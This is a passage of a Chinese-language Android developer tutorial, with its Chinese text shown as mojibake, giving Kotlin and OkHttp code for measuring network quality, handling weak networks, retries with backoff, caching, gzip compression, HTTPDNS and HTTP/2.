        MODERATE,   <span class="hljs-comment">// ä¸­ç­‰</span>
        POOR,       <span class="hljs-comment">// è¾ƒå·®</span>
        VERY_POOR   <span class="hljs-comment">// æå·®</span>
    }

    <span class="hljs-comment">// è·å–å½“å‰ç½‘ç»œç±»å‹</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNetworkType</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> network = connectivityManager.activeNetwork ?: <span class="hljs-keyword">return</span> <span class="hljs-string">"NONE"</span>
        <span class="hljs-keyword">val</span> capabilities = connectivityManager.getNetworkCapabilities(network) ?: <span class="hljs-keyword">return</span> <span class="hljs-string">"NONE"</span>

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -&gt; <span class="hljs-string">"WIFI"</span>
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -&gt; {
                <span class="hljs-comment">// è·å–å…·ä½“çš„ç§»åŠ¨ç½‘ç»œç±»å‹</span>
                <span class="hljs-keyword">val</span> telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) <span class="hljs-keyword">as</span> TelephonyManager
                <span class="hljs-keyword">when</span> (telephonyManager.dataNetworkType) {
                    TelephonyManager.NETWORK_TYPE_LTE -&gt; <span class="hljs-string">"4G"</span>
                    TelephonyManager.NETWORK_TYPE_NR -&gt; <span class="hljs-string">"5G"</span>
                    <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"3G"</span>
                }
            }
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"OTHER"</span>
        }
    }

    <span class="hljs-comment">// æµ‹é‡ç½‘ç»œå»¶è¿Ÿ(RTT)å’Œå¸¦å®½</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">measureNetworkQuality</span><span class="hljs-params">()</span></span>: NetworkQuality = withContext(Dispatchers.IO) {
        <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. æµ‹è¯•å»¶è¿Ÿ - pingä¸€ä¸ªå°æ–‡ä»¶</span>
            <span class="hljs-keyword">val</span> pingUrl = URL(<span class="hljs-string">"https://www.google.com/generate_204"</span>)
            <span class="hljs-keyword">val</span> connection = pingUrl.openConnection() <span class="hljs-keyword">as</span> HttpURLConnection
            connection.requestMethod = <span class="hljs-string">"GET"</span>
            connection.connectTimeout = <span class="hljs-number">5000</span>
            connection.readTimeout = <span class="hljs-number">5000</span>

            <span class="hljs-keyword">val</span> responseCode = connection.responseCode
            <span class="hljs-keyword">val</span> rtt = System.currentTimeMillis() - startTime

            connection.disconnect()

            <span class="hljs-comment">// 2. æ ¹æ®RTTåˆ¤æ–­ç½‘ç»œè´¨é‡</span>
            <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> <span class="hljs-keyword">when</span> {
                rtt &lt; <span class="hljs-number">100</span> -&gt; NetworkQuality.EXCELLENT    <span class="hljs-comment">// &lt;100ms ä¼˜ç§€</span>
                rtt &lt; <span class="hljs-number">300</span> -&gt; NetworkQuality.GOOD         <span class="hljs-comment">// 100-300ms è‰¯å¥½</span>
                rtt &lt; <span class="hljs-number">600</span> -&gt; NetworkQuality.MODERATE     <span class="hljs-comment">// 300-600ms ä¸­ç­‰</span>
                rtt &lt; <span class="hljs-number">1000</span> -&gt; NetworkQuality.POOR        <span class="hljs-comment">// 600-1000ms è¾ƒå·®</span>
                <span class="hljs-keyword">else</span> -&gt; NetworkQuality.VERY_POOR         <span class="hljs-comment">// &gt;1000ms æå·®</span>
            }

        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(<span class="hljs-string">"NetworkQuality"</span>, <span class="hljs-string">"æµ‹é‡å¤±è´¥"</span>, e)
            <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> NetworkQuality.VERY_POOR
        }
    }

    <span class="hljs-comment">// è·å–ç½‘ç»œä¿¡å·å¼ºåº¦(ä»…WiFiå’Œç§»åŠ¨ç½‘ç»œ)</span>
    <span class="hljs-meta">@SuppressLint(<span class="hljs-string">"MissingPermission"</span>)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getSignalStrength</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">val</span> network = connectivityManager.activeNetwork ?: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">val</span> capabilities = connectivityManager.getNetworkCapabilities(network) ?: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -&gt; {
                <span class="hljs-keyword">val</span> wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) <span class="hljs-keyword">as</span> WifiManager
                <span class="hljs-keyword">val</span> wifiInfo = wifiManager.connectionInfo
                <span class="hljs-keyword">val</span> level = WifiManager.calculateSignalLevel(wifiInfo.rssi, <span class="hljs-number">5</span>)
                (level + <span class="hljs-number">1</span>) * <span class="hljs-number">20</span>  <span class="hljs-comment">// è½¬æ¢ä¸º0-100</span>
            }
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -&gt; {
                <span class="hljs-comment">// éœ€è¦ ACCESS_FINE_LOCATION æƒé™</span>
                <span class="hljs-keyword">val</span> telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) <span class="hljs-keyword">as</span> TelephonyManager
                <span class="hljs-comment">// è¿™é‡Œç®€åŒ–å¤„ç†,å®é™…éœ€è¦ä½¿ç”¨ PhoneStateListener</span>
                <span class="hljs-number">50</span>  <span class="hljs-comment">// é»˜è®¤è¿”å›50</span>
            }
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-number">0</span>
        }
    }
}
</code></pre>
<p>ä½¿ç”¨ç¤ºä¾‹:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> monitor = NetworkQualityMonitor(context)

lifecycleScope.launch {
    <span class="hljs-keyword">val</span> networkType = monitor.getNetworkType()
    <span class="hljs-keyword">val</span> quality = monitor.measureNetworkQuality()
    <span class="hljs-keyword">val</span> signalStrength = monitor.getSignalStrength()

    Log.d(<span class="hljs-string">"Network"</span>, <span class="hljs-string">"ç±»å‹: <span class="hljs-variable">$networkType</span>, è´¨é‡: <span class="hljs-variable">$quality</span>, ä¿¡å·: <span class="hljs-variable">$signalStrength</span>%"</span>)

    <span class="hljs-comment">// æ ¹æ®ç½‘ç»œè´¨é‡è°ƒæ•´ç­–ç•¥</span>
    <span class="hljs-keyword">when</span> (quality) {
        NetworkQuality.EXCELLENT, NetworkQuality.GOOD -&gt; {
            <span class="hljs-comment">// æ­£å¸¸åŠ è½½é«˜æ¸…å›¾ç‰‡</span>
            loadHighQualityImages()
        }
        NetworkQuality.MODERATE -&gt; {
            <span class="hljs-comment">// åŠ è½½ä¸­ç­‰è´¨é‡å›¾ç‰‡</span>
            loadMediumQualityImages()
        }
        NetworkQuality.POOR, NetworkQuality.VERY_POOR -&gt; {
            <span class="hljs-comment">// åŠ è½½ä½è´¨é‡å›¾ç‰‡,å‡å°‘è¯·æ±‚</span>
            loadLowQualityImages()
            showNetworkPoorTip()
        }
    }
}
</code></pre>
<h2 data-id="heading-43">å¼±ç½‘ä¼˜åŒ–ç­–ç•¥</h2>
<h3 data-id="heading-44">å¼±ç½‘ç¯å¢ƒè¯†åˆ«</h3>
<p>é™¤äº†ä¸Šé¢çš„ç½‘ç»œè´¨é‡ç›‘æ§,æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¯†åˆ«å¼±ç½‘:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeakNetworkDetector</span> {

    <span class="hljs-comment">// æ–¹æ³•1: é€šè¿‡ç½‘ç»œç±»å‹åˆ¤æ–­</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isWeakNetwork</span><span class="hljs-params">(networkType: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> networkType <span class="hljs-keyword">in</span> listOf(<span class="hljs-string">"2G"</span>, <span class="hljs-string">"3G"</span>, <span class="hljs-string">"EDGE"</span>, <span class="hljs-string">"GPRS"</span>)
    }

    <span class="hljs-comment">// æ–¹æ³•2: é€šè¿‡è¯·æ±‚è¶…æ—¶æ¬¡æ•°åˆ¤æ–­</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> consecutiveTimeouts = <span class="hljs-number">0</span>

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onRequestTimeout</span><span class="hljs-params">()</span></span> {
        consecutiveTimeouts++
        <span class="hljs-keyword">if</span> (consecutiveTimeouts &gt;= <span class="hljs-number">3</span>) {
            <span class="hljs-comment">// è¿ç»­3æ¬¡è¶…æ—¶,åˆ¤å®šä¸ºå¼±ç½‘</span>
            enableWeakNetworkMode()
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onRequestSuccess</span><span class="hljs-params">()</span></span> {
        consecutiveTimeouts = <span class="hljs-number">0</span>
    }

    <span class="hljs-comment">// æ–¹æ³•3: é€šè¿‡ä¸‹è½½é€Ÿåº¦åˆ¤æ–­</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isSlowDownload</span><span class="hljs-params">(bytesDownloaded: <span class="hljs-type">Long</span>, durationMs: <span class="hljs-type">Long</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">val</span> speedKBps = bytesDownloaded / <span class="hljs-number">1024.0</span> / (durationMs / <span class="hljs-number">1000.0</span>)
        <span class="hljs-keyword">return</span> speedKBps &lt; <span class="hljs-number">50</span>  <span class="hljs-comment">// ä½äº50KB/sè®¤ä¸ºæ˜¯å¼±ç½‘</span>
    }
}
</code></pre>
<h3 data-id="heading-45">è¶…æ—¶ç­–ç•¥è®¾ç½®</h3>
<p><strong>åŠ¨æ€è¶…æ—¶</strong> - æ ¹æ®ç½‘ç»œè´¨é‡è°ƒæ•´:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">object</span> TimeoutConfig {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getConnectTimeout</span><span class="hljs-params">(networkQuality: <span class="hljs-type">NetworkQuality</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (networkQuality) {
            NetworkQuality.EXCELLENT -&gt; <span class="hljs-number">5_000L</span>      <span class="hljs-comment">// 5ç§’</span>
            NetworkQuality.GOOD -&gt; <span class="hljs-number">8_000L</span>           <span class="hljs-comment">// 8ç§’</span>
            NetworkQuality.MODERATE -&gt; <span class="hljs-number">15_000L</span>      <span class="hljs-comment">// 15ç§’</span>
            NetworkQuality.POOR -&gt; <span class="hljs-number">25_000L</span>          <span class="hljs-comment">// 25ç§’</span>
            NetworkQuality.VERY_POOR -&gt; <span class="hljs-number">40_000L</span>     <span class="hljs-comment">// 40ç§’</span>
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getReadTimeout</span><span class="hljs-params">(networkQuality: <span class="hljs-type">NetworkQuality</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-keyword">return</span> getConnectTimeout(networkQuality) * <span class="hljs-number">2</span>  <span class="hljs-comment">// è¯»å–è¶…æ—¶æ˜¯è¿æ¥è¶…æ—¶çš„2å€</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨OkHttpé…ç½®åŠ¨æ€è¶…æ—¶</span>
<span class="hljs-keyword">val</span> client = OkHttpClient.Builder()
    .connectTimeout(TimeoutConfig.getConnectTimeout(currentQuality), TimeUnit.MILLISECONDS)
    .readTimeout(TimeoutConfig.getReadTimeout(currentQuality), TimeUnit.MILLISECONDS)
    .build()
</code></pre>
<h3 data-id="heading-46">é‡è¯•æœºåˆ¶ä¼˜åŒ–</h3>
<p><strong>æŒ‡æ•°é€€é¿é‡è¯•</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryInterceptor</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> maxRetries: <span class="hljs-built_in">Int</span> = <span class="hljs-number">3</span>) : Interceptor {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">intercept</span><span class="hljs-params">(chain: <span class="hljs-type">Interceptor</span>.<span class="hljs-type">Chain</span>)</span></span>: Response {
        <span class="hljs-keyword">var</span> request = chain.request()
        <span class="hljs-keyword">var</span> response: Response? = <span class="hljs-literal">null</span>
        <span class="hljs-keyword">var</span> retryCount = <span class="hljs-number">0</span>
        <span class="hljs-keyword">var</span> exception: IOException? = <span class="hljs-literal">null</span>

        <span class="hljs-keyword">while</span> (retryCount &lt; maxRetries) {
            <span class="hljs-keyword">try</span> {
                response = chain.proceed(request)

                <span class="hljs-comment">// æˆåŠŸ,è¿”å›ç»“æœ</span>
                <span class="hljs-keyword">if</span> (response.isSuccessful) {
                    <span class="hljs-keyword">return</span> response
                }

                <span class="hljs-comment">// æœåŠ¡å™¨é”™è¯¯(5xx)æ‰é‡è¯•,å®¢æˆ·ç«¯é”™è¯¯(4xx)ä¸é‡è¯•</span>
                <span class="hljs-keyword">if</span> (response.code !<span class="hljs-keyword">in</span> <span class="hljs-number">500.</span><span class="hljs-number">.599</span>) {
                    <span class="hljs-keyword">return</span> response
                }

            } <span class="hljs-keyword">catch</span> (e: IOException) {
                exception = e
                Log.w(<span class="hljs-string">"RetryInterceptor"</span>, <span class="hljs-string">"è¯·æ±‚å¤±è´¥,å‡†å¤‡é‡è¯•: <span class="hljs-subst">${retryCount + <span class="hljs-number">1</span>}</span>/<span class="hljs-variable">$maxRetries</span>"</span>, e)
            }

            retryCount++

            <span class="hljs-comment">// æŒ‡æ•°é€€é¿: 1ç§’ â†’ 2ç§’ â†’ 4ç§’</span>
            <span class="hljs-keyword">val</span> delayMs = (<span class="hljs-number">1000</span> * Math.pow(<span class="hljs-number">2.0</span>, retryCount.toDouble() - <span class="hljs-number">1</span>)).toLong()
            Thread.sleep(delayMs)
        }

        <span class="hljs-comment">// æ‰€æœ‰é‡è¯•éƒ½å¤±è´¥,æŠ›å‡ºå¼‚å¸¸æˆ–è¿”å›æœ€åçš„å“åº”</span>
        <span class="hljs-keyword">return</span> response ?: <span class="hljs-keyword">throw</span> exception ?: IOException(<span class="hljs-string">"è¯·æ±‚å¤±è´¥ä¸”æ— å“åº”"</span>)
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">val</span> client = OkHttpClient.Builder()
    .addInterceptor(RetryInterceptor(maxRetries = <span class="hljs-number">3</span>))
    .build()
</code></pre>
<h3 data-id="heading-47">é™çº§ç­–ç•¥</h3>
<p>å½“ç½‘ç»œæå·®æ—¶,å¯ç”¨é™çº§ç­–ç•¥:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkDegradationStrategy</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> networkMonitor: NetworkQualityMonitor) {

    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">executeWithDegradation</span><span class="hljs-params">(
        normalAction: <span class="hljs-type">suspend</span> () -&gt; <span class="hljs-type">T</span>,
        degradedAction: <span class="hljs-type">suspend</span> () -&gt; <span class="hljs-type">T</span>
    )</span></span>: T {
        <span class="hljs-keyword">val</span> quality = networkMonitor.measureNetworkQuality()

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (quality <span class="hljs-keyword">in</span> listOf(NetworkQuality.POOR, NetworkQuality.VERY_POOR)) {
            Log.d(<span class="hljs-string">"Degradation"</span>, <span class="hljs-string">"ç½‘ç»œè¾ƒå·®,ä½¿ç”¨é™çº§ç­–ç•¥"</span>)
            degradedAction()
        } <span class="hljs-keyword">else</span> {
            normalAction()
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">val</span> strategy = NetworkDegradationStrategy(networkMonitor)

<span class="hljs-keyword">val</span> articles = strategy.executeWithDegradation(
    normalAction = {
        <span class="hljs-comment">// æ­£å¸¸æƒ…å†µ:åŠ è½½å®Œæ•´æ–‡ç« åˆ—è¡¨(åŒ…å«å›¾ç‰‡)</span>
        api.getArticleListWithImages()
    },
    degradedAction = {
        <span class="hljs-comment">// é™çº§:åªåŠ è½½æ ‡é¢˜åˆ—è¡¨(ä¸å«å›¾ç‰‡)</span>
        api.getArticleListTitleOnly()
    }
)
</code></pre>
<h3 data-id="heading-48">æ•°æ®å‹ç¼©</h3>
<p>ä½¿ç”¨Gzipå‹ç¼©è¯·æ±‚å’Œå“åº”:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// OkHttpé»˜è®¤æ”¯æŒGzip,ä½†è¦ç¡®ä¿æœåŠ¡å™¨ä¹Ÿæ”¯æŒ</span>
<span class="hljs-keyword">val</span> client = OkHttpClient.Builder()
    .addInterceptor { chain -&gt;
        <span class="hljs-keyword">val</span> original = chain.request()

        <span class="hljs-comment">// è¯·æ±‚æ—¶æ·»åŠ Accept-Encoding</span>
        <span class="hljs-keyword">val</span> request = original.newBuilder()
            .header(<span class="hljs-string">"Accept-Encoding"</span>, <span class="hljs-string">"gzip"</span>)
            .build()

        chain.proceed(request)
    }
    .build()
</code></pre>
<p>å¯¹äºä¸Šä¼ ,ä¹Ÿå¯ä»¥æ‰‹åŠ¨Gzipå‹ç¼©:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">compressRequestBody</span><span class="hljs-params">(body: <span class="hljs-type">RequestBody</span>)</span></span>: RequestBody {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">object</span> : RequestBody() {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">contentType</span><span class="hljs-params">()</span></span> = body.contentType()

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">contentLength</span><span class="hljs-params">()</span></span> = -<span class="hljs-number">1L</span>  <span class="hljs-comment">// ä¸çŸ¥é“å‹ç¼©åçš„å¤§å°</span>

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">writeTo</span><span class="hljs-params">(sink: <span class="hljs-type">BufferedSink</span>)</span></span> {
            <span class="hljs-keyword">val</span> gzipSink = GzipSink(sink)
            <span class="hljs-keyword">val</span> gzipBuffer = gzipSink.buffer()
            body.writeTo(gzipBuffer)
            gzipBuffer.close()
        }
    }
}
</code></pre>
<h3 data-id="heading-49">è¯·æ±‚åˆå¹¶</h3>
<p>å°†å¤šä¸ªå°è¯·æ±‚åˆå¹¶ä¸ºä¸€ä¸ªæ‰¹é‡è¯·æ±‚:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ ä¸å¥½:å¤šæ¬¡è¯·æ±‚</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">loadUserProfiles</span><span class="hljs-params">(userIds: <span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt;)</span></span> {
    userIds.forEach { userId -&gt;
        <span class="hljs-keyword">val</span> profile = api.getUserProfile(userId)  <span class="hljs-comment">// Næ¬¡ç½‘ç»œè¯·æ±‚</span>
        updateUI(profile)
    }
}

<span class="hljs-comment">// âœ… æ›´å¥½:æ‰¹é‡è¯·æ±‚</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">loadUserProfiles</span><span class="hljs-params">(userIds: <span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt;)</span></span> {
    <span class="hljs-keyword">val</span> profiles = api.getBatchUserProfiles(userIds)  <span class="hljs-comment">// 1æ¬¡ç½‘ç»œè¯·æ±‚</span>
    profiles.forEach { profile -&gt;
        updateUI(profile)
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// APIå®šä¹‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserApi</span> {
    <span class="hljs-meta">@GET(<span class="hljs-string">"user/{userId}"</span>)</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUserProfile</span><span class="hljs-params">(<span class="hljs-meta">@Path(<span class="hljs-string">"userId"</span>)</span> userId: <span class="hljs-type">String</span>)</span></span>: UserProfile

    <span class="hljs-meta">@POST(<span class="hljs-string">"users/batch"</span>)</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getBatchUserProfiles</span><span class="hljs-params">(<span class="hljs-meta">@Body</span> userIds: <span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt;)</span></span>: List&lt;UserProfile&gt;
}
</code></pre>
<h3 data-id="heading-50">ç¦»çº¿ç¼“å­˜ç­–ç•¥</h3>
<p>ä½¿ç”¨OkHttpçš„ç¼“å­˜æœºåˆ¶:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. é…ç½®ç¼“å­˜ç›®å½•å’Œå¤§å°</span>
<span class="hljs-keyword">val</span> cacheSize = <span class="hljs-number">50L</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment">// 50MB</span>
<span class="hljs-keyword">val</span> cache = Cache(context.cacheDir, cacheSize)

<span class="hljs-keyword">val</span> client = OkHttpClient.Builder()
    .cache(cache)
    .addNetworkInterceptor(CacheInterceptor())
    .build()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptor</span> : <span class="hljs-type">Interceptor</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">intercept</span><span class="hljs-params">(chain: <span class="hljs-type">Interceptor</span>.<span class="hljs-type">Chain</span>)</span></span>: Response {
        <span class="hljs-keyword">var</span> request = chain.request()

        <span class="hljs-comment">// å¼±ç½‘æ—¶ä¼˜å…ˆä½¿ç”¨ç¼“å­˜</span>
        <span class="hljs-keyword">if</span> (isWeakNetwork()) {
            request = request.newBuilder()
                .cacheControl(
                    CacheControl.Builder()
                        .maxStale(<span class="hljs-number">7</span>, TimeUnit.DAYS)  <span class="hljs-comment">// ç¼“å­˜æœ‰æ•ˆæœŸ7å¤©</span>
                        .build()
                )
                .build()
        }

        <span class="hljs-keyword">val</span> response = chain.proceed(request)

        <span class="hljs-comment">// å¯¹å“åº”è®¾ç½®ç¼“å­˜ç­–ç•¥</span>
        <span class="hljs-keyword">return</span> response.newBuilder()
            .header(<span class="hljs-string">"Cache-Control"</span>, <span class="hljs-string">"public, max-age=3600"</span>)  <span class="hljs-comment">// ç¼“å­˜1å°æ—¶</span>
            .removeHeader(<span class="hljs-string">"Pragma"</span>)
            .build()
    }
}
</code></pre>
<p><strong>æ›´å®Œæ•´çš„ç¼“å­˜ç­–ç•¥</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartCacheStrategy</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> networkMonitor: NetworkQualityMonitor
) {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> sharedPrefs = context.getSharedPreferences(<span class="hljs-string">"cache_meta"</span>, Context.MODE_PRIVATE)

    <span class="hljs-comment">// åˆ¤æ–­ç¼“å­˜æ˜¯å¦å¯ç”¨</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isCacheValid</span><span class="hljs-params">(key: <span class="hljs-type">String</span>, maxAgeSeconds: <span class="hljs-type">Long</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">val</span> cachedTime = sharedPrefs.getLong(key, <span class="hljs-number">0</span>)
        <span class="hljs-keyword">val</span> age = (System.currentTimeMillis() - cachedTime) / <span class="hljs-number">1000</span>
        <span class="hljs-keyword">return</span> age &lt; maxAgeSeconds
    }

    <span class="hljs-comment">// ä¿å­˜ç¼“å­˜æ—¶é—´æˆ³</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">markCached</span><span class="hljs-params">(key: <span class="hljs-type">String</span>)</span></span> {
        sharedPrefs.edit().putLong(key, System.currentTimeMillis()).apply()
    }

    <span class="hljs-comment">// æ ¹æ®ç½‘ç»œè´¨é‡å†³å®šç¼“å­˜ç­–ç•¥</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCacheMaxAge</span><span class="hljs-params">(networkQuality: <span class="hljs-type">NetworkQuality</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (networkQuality) {
            NetworkQuality.EXCELLENT, NetworkQuality.GOOD -&gt; <span class="hljs-number">300L</span>      <span class="hljs-comment">// 5åˆ†é’Ÿ</span>
            NetworkQuality.MODERATE -&gt; <span class="hljs-number">1800L</span>                           <span class="hljs-comment">// 30åˆ†é’Ÿ</span>
            NetworkQuality.POOR, NetworkQuality.VERY_POOR -&gt; <span class="hljs-number">86400L</span>    <span class="hljs-comment">// 1å¤©</span>
        }
    }
}
</code></pre>
<h2 data-id="heading-51">ç½‘ç»œä¼˜åŒ–æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-52">1. DNSä¼˜åŒ–</h3>
<p>ä½¿ç”¨HTTPDNSé¿å…DNSåŠ«æŒå’Œæå‡è§£æé€Ÿåº¦:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä½¿ç”¨é˜¿é‡Œäº‘HTTPDNS(ç¤ºä¾‹)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpDnsInterceptor</span> : <span class="hljs-type">Interceptor</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">intercept</span><span class="hljs-params">(chain: <span class="hljs-type">Interceptor</span>.<span class="hljs-type">Chain</span>)</span></span>: Response {
        <span class="hljs-keyword">val</span> original = chain.request()
        <span class="hljs-keyword">val</span> url = original.url

        <span class="hljs-comment">// ä½¿ç”¨HTTPDNSè§£æIP</span>
        <span class="hljs-keyword">val</span> ip = HttpDns.getIpByHost(url.host)

        <span class="hljs-keyword">if</span> (ip != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">val</span> newUrl = url.newBuilder()
                .host(ip)
                .build()

            <span class="hljs-keyword">val</span> newRequest = original.newBuilder()
                .url(newUrl)
                .header(<span class="hljs-string">"Host"</span>, url.host)  <span class="hljs-comment">// ä¿ç•™åŸå§‹Host</span>
                .build()

            <span class="hljs-keyword">return</span> chain.proceed(newRequest)
        }

        <span class="hljs-keyword">return</span> chain.proceed(original)
    }
}
</code></pre>
<h3 data-id="heading-53">2. è¿æ¥å¤ç”¨ - HTTP/2</h3>
<p>ä½¿ç”¨OkHttpé»˜è®¤æ”¯æŒHTTP/2,å®ç°è¯·æ±‚å¤šè·¯å¤ç”¨:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> client = OkHttpClient.Builder()
    .protocols(listOf(Protocol.HTTP_2, Protocol.HTTP_1_1))  <span class="hljs-comment">// æ”¯æŒHTTP/2</span>
    .build()
</code></pre>
<p>HTTP/2çš„ä¼˜åŠ¿:</p>
<ul>
<li><strong>å¤šè·¯å¤ç”¨</strong> - ä¸€ä¸ªè¿æ¥å¯ä»¥å¹¶å‘å¤šä¸ªè¯·æ±‚</li>
<li><strong>å¤´éƒ¨å‹ç¼©</strong> - å‡å°‘é‡å¤å¤´éƒ¨çš„ä¼ è¾“</li>
<li><strong>æœåŠ¡å™¨æ¨é€</strong> - ä¸»åŠ¨æ¨é€èµ„æº</li>
</ul>
<h3 data-id="heading-54">3. å›¾ç‰‡åŠ è½½ä¼˜åŒ–</h3>
<p>ä½¿ç”¨Glide/Coilè¿›è¡Œæ™ºèƒ½åŠ è½½:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ ¹æ®ç½‘ç»œè´¨é‡åŠ è½½ä¸åŒåˆ†è¾¨ç‡çš„å›¾ç‰‡</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">loadImage</span><span class="hljs-params">(imageView: <span class="hljs-type">ImageView</span>, imageUrl: <span class="hljs-type">String</span>, networkQuality: <span class="hljs-type">NetworkQuality</span>)</span></span> {
    <span class="hljs-keyword">val</span> url = <span class="hljs-keyword">when</span> (networkQuality) {
        NetworkQuality.EXCELLENT, NetworkQuality.GOOD -&gt; <span class="hljs-string">"<span class="hljs-subst">${imageUrl}</span>?quality=high"</span>
